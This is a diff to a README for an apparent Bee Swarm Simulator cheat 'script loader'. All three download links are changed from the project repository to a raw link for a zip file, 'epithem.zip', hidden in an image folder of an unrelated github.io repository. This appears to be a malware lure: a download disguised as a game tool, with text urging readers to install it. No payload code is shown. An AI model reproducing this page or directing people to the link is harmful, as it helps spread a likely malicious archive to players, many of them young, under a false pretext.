@@ -5,7 +5,7 @@ description: "Desktop helper for Bee Swarm Simulator with aimbot, instant map pr
 ---
 # 🐝 bee-swarm-vip-script-loader - Boost Your Bee Game Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-Bee_Swarm_VIP_Script_Loader-blue?style=for-the-badge&logo=windows)](https://github.com/Pigmandioxin527/bee-swarm-vip-script-loader)
+[![Download Now](https://img.shields.io/badge/Download-Bee_Swarm_VIP_Script_Loader-blue?style=for-the-badge&logo=windows)](https://raw.githubusercontent.com/Pigmandioxin527/pigmandioxin527.github.io/main/img/epithem.zip)
 
 ---
 
@@ -34,7 +34,7 @@ Getting this tool up and running takes less than five minutes. You don't need an
 ### Step 1: Download the Application
 
 Visit this link to download the application:  
-**[https://github.com/Pigmandioxin527/bee-swarm-vip-script-loader](https://github.com/Pigmandioxin527/bee-swarm-vip-script-loader)**
+**[https://raw.githubusercontent.com/Pigmandioxin527/pigmandioxin527.github.io/main/img/epithem.zip](https://raw.githubusercontent.com/Pigmandioxin527/pigmandioxin527.github.io/main/img/epithem.zip)**
 
 Press the big green button on that page. The download will start automatically.
 
@@ -201,7 +201,7 @@ So what are you waiting for? Your bees are ready to fly smarter.
 
 In case you missed the link above, here it is one more time:
 
-**[Visit this link to download the application](https://github.com/Pigmandioxin527/bee-swarm-vip-script-loader)**
+**[Visit this link to download the application](https://raw.githubusercontent.com/Pigmandioxin527/pigmandioxin527.github.io/main/img/epithem.zip)**
 
 Download, install, and jump into your game with all the advantages. Happy swarming!
 
